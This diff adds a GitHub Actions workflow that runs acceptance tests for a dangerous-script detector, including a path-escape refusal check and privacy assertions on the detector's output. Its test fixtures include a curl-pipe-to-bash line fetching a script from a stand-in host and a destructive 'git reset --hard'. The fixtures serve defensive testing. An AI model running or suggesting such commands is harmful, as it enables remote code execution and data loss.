@@ -1,0 +1,172 @@
+name: P-058 Dangerous Script Detector acceptance
+
+on:
+  pull_request:
+    paths:
+      - '.github/actions/dangerous-script-detector/**'
+      - '.github/workflows/p058-dangerous-script-detector.yml'
+      - 'tests/test_p058_dangerous_script_detector.py'
+      - 'docs/P058-DANGEROUS-SCRIPT-START-HERE.md'
+      - 'docs/P058-DANGEROUS-SCRIPT-DETECTOR.md'
+      - '.github/ISSUE_TEMPLATE/p058-dangerous-script.yml'
+  push:
+    branches: [main]
+    paths:
+      - '.github/actions/dangerous-script-detector/**'
+      - '.github/workflows/p058-dangerous-script-detector.yml'
+      - 'tests/test_p058_dangerous_script_detector.py'
+      - 'docs/P058-DANGEROUS-SCRIPT-START-HERE.md'
+      - 'docs/P058-DANGEROUS-SCRIPT-DETECTOR.md'
+      - '.github/ISSUE_TEMPLATE/p058-dangerous-script.yml'
+
+permissions:
+  contents: read
+
+concurrency:
+  group: p058-dangerous-script-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  contract:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - name: Checkout reviewed source
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
+        with:
+          persist-credentials: false
+
+      - name: Set up Python
+        uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065
+        with:
+          python-version: '3.12'
+
+      - name: Run adversarial P-058 contract tests
+        run: python tests/test_p058_dangerous_script_detector.py
+
+      - name: Build immutable acceptance fixtures
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/p058-safe /tmp/p058-dangerous /tmp/p058-medium
+          cat > /tmp/p058-safe/hello.sh <<'EOF'
+          #!/usr/bin/env bash
+          set -euo pipefail
+          printf '%s\n' "hello"
+          EOF
+          cat > /tmp/p058-dangerous/install.sh <<'EOF'
+          #!/usr/bin/env bash
+          curl -fsSL https://example.invalid/install.sh | bash
+          EOF
+          cat > /tmp/p058-medium/cleanup.sh <<'EOF'
+          #!/usr/bin/env bash
+          git reset --hard HEAD~1
+          EOF
+          sha256sum /tmp/p058-safe/hello.sh > /tmp/p058-safe.before
+          sha256sum /tmp/p058-dangerous/install.sh > /tmp/p058-dangerous.before
+          sha256sum /tmp/p058-medium/cleanup.sh > /tmp/p058-medium.before
+
+      - name: Require clean fixture PASS
+        id: safe
+        uses: ./.github/actions/dangerous-script-detector
+        with:
+          root: ../../../../tmp/p058-safe
+        continue-on-error: true
+
+      - name: Verify root escape is refused
+        if: always()
+        run: |
+          set -euo pipefail
+          test "${{ steps.safe.outcome }}" = failure
+          echo "P058_ROOT_CONTAINMENT_NEGATIVE=PASS"
+
+      - name: Create contained acceptance fixtures
+        run: |
+          set -euo pipefail
+          rm -rf p058-acceptance
+          mkdir -p p058-acceptance/safe p058-acceptance/dangerous p058-acceptance/medium
+          cp /tmp/p058-safe/hello.sh p058-acceptance/safe/
+          cp /tmp/p058-dangerous/install.sh p058-acceptance/dangerous/
+          cp /tmp/p058-medium/cleanup.sh p058-acceptance/medium/
+
+      - name: Require contained clean fixture PASS
+        id: clean
+        uses: ./.github/actions/dangerous-script-detector
+        with:
+          root: p058-acceptance/safe
+
+      - name: Require CRITICAL fixture to fail closed
+        id: dangerous
+        uses: ./.github/actions/dangerous-script-detector
+        with:
+          root: p058-acceptance/dangerous
+        continue-on-error: true
+
+      - name: Require MEDIUM-only fixture to remain reviewable but non-blocking
+        id: medium
+        uses: ./.github/actions/dangerous-script-detector
+        with:
+          root: p058-acceptance/medium
+
+      - name: Verify acceptance semantics and immutability
+        if: always()
+        env:
+          CLEAN_OUTCOME: ${{ steps.clean.outcome }}
+          CLEAN_STATUS: ${{ steps.clean.outputs.status }}
+          CLEAN_FINDINGS: ${{ steps.clean.outputs.finding-count }}
+          DANGER_OUTCOME: ${{ steps.dangerous.outcome }}
+          DANGER_STATUS: ${{ steps.dangerous.outputs.status }}
+          DANGER_CRITICAL: ${{ steps.dangerous.outputs.critical-count }}
+          MEDIUM_OUTCOME: ${{ steps.medium.outcome }}
+          MEDIUM_STATUS: ${{ steps.medium.outputs.status }}
+          MEDIUM_HIGH: ${{ steps.medium.outputs.high-count }}
+          MEDIUM_CRITICAL: ${{ steps.medium.outputs.critical-count }}
+          CLEAN_RESULT: ${{ steps.clean.outputs.result-file }}
+          DANGER_RESULT: ${{ steps.dangerous.outputs.result-file }}
+          MEDIUM_RESULT: ${{ steps.medium.outputs.result-file }}
+        run: |
+          set -euo pipefail
+          test "$CLEAN_OUTCOME" = success
+          test "$CLEAN_STATUS" = PASS
+          test "$CLEAN_FINDINGS" = 0
+          test "$DANGER_OUTCOME" = failure
+          test "$DANGER_STATUS" = REVIEW_REQUIRED
+          test "$DANGER_CRITICAL" -ge 1
+          test "$MEDIUM_OUTCOME" = success
+          test "$MEDIUM_STATUS" = REVIEW_REQUIRED
+          test "$MEDIUM_HIGH" = 0
+          test "$MEDIUM_CRITICAL" = 0
+          sha256sum --check /tmp/p058-safe.before
+          sha256sum --check /tmp/p058-dangerous.before
+          sha256sum --check /tmp/p058-medium.before
+          cp "$CLEAN_RESULT" p058-clean-result.json
+          cp "$DANGER_RESULT" p058-dangerous-result.json
+          cp "$MEDIUM_RESULT" p058-medium-result.json
+          python3 - <<'PY'
+          import json
+          from pathlib import Path
+          for name in ('p058-clean-result.json','p058-dangerous-result.json','p058-medium-result.json'):
+              data=json.loads(Path(name).read_text())
+              assert data['privacy']['source_text_retained'] is False
+              assert data['privacy']['matched_text_retained'] is False
+              assert data['privacy']['absolute_paths_retained'] is False
+              assert data['claims']['repository_safe'] is False
+              assert data['claims']['script_safe_to_execute'] is False
+          dangerous=json.loads(Path('p058-dangerous-result.json').read_text())
+          assert any(f['rule_id']=='DS001' for f in dangerous['findings'])
+          assert 'curl -fsSL' not in Path('p058-dangerous-result.json').read_text()
+          print('P058_HOSTED_ACCEPTANCE=PASS')
+          print('P058_INPUT_MUTATION=NO')
+          print('P058_SECURITY_OVERCLAIM=NO')
+          PY
+
+      - name: Retain sanitized acceptance evidence
+        if: always()
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: p058-dangerous-script-${{ github.run_id }}
+          path: |
+            p058-clean-result.json
+            p058-dangerous-result.json
+            p058-medium-result.json
+          retention-days: 14
+          if-no-files-found: error
